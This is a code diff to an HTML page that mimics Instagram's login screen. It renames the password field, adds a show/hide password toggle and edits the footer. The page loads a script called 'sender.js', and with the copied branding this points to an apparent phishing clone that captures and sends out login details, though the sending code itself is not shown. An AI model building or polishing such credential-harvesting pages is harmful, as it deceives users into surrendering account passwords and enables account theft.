@@ -22,7 +22,8 @@
              <label for="email" class="sr-only">Phone, username, or email</label>
             <input type="email" name="email" id="email" placeholder="Phone, username, or email" required>
             <label for="password" class="sr-only">Password</label>
-            <input type="text"  name="name" id="name" placeholder="password" required>
+            <input type="text"  name="password" id="password" placeholder="password" required>
+            <span class="toggle-password" onclick="togglePassword()">show</span>
             <input type="submit" value="log in" id="btn">
         </form>
         </div>
@@ -71,10 +72,24 @@
             <li><a href="#">HASHTAGS</a></li>
             <li><a href="#">LANGUAGE</a></li>
         </ul>
-        <p class="copyright">© 2025 Instagram from Meta</p>
+        <p class="copyright">© 2025 Instagram from Facebook</p>
     </footer>
     <link rel="stylesheet" href="ins.css">
     <script src="sender.js"></script>
+    <script>
+    function togglePassword() {
+        const passwordField = document.getElementById('password');
+        const toggleButton = document.querySelector('.toggle-password');
+
+        if (passwordField.type === 'password') {
+            passwordField.type = 'text';
+            toggleButton.textContent = 'hide';
+        } else {
+            passwordField.type = 'password';
+            toggleButton.textContent = 'show';
+        }
+    }
+</script>
 </body>
 </html>
 
